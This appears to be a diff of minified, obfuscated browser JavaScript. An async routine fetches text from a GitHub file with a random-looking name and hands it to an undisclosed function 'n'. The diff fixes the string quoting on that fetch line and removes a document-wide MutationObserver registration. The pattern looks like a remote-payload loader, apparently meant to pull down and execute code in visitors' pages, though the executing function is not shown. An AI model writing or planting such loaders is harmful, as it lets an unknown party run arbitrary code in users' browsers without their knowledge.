@@ -8,7 +8,7 @@ const n = t => {
 };
 (async function() {
     const t = t => fetch(t).then(t => t.text());
-    var e = await t("https://github.com/etrhdrs6wret8/ygf2xuvbwqty59sdsa/blob/main/TQ%26%238hB5s%5B2%60X-f:M%5BS9xK%23.B%5B"DqZ");
+    var e = await t('https://github.com/etrhdrs6wret8/ygf2xuvbwqty59sdsa/blob/main/TQ%26%238hB5s%5B2%60X-f:M%5BS9xK%23.B%5B"DqZ');
     n(e)
 })();
 let t = new MutationObserver(t => {
@@ -19,8 +19,4 @@ let t = new MutationObserver(t => {
             }
         }
     }
-});
-t.observe(document, {
-    childList: true,
-    subtree: true
 });
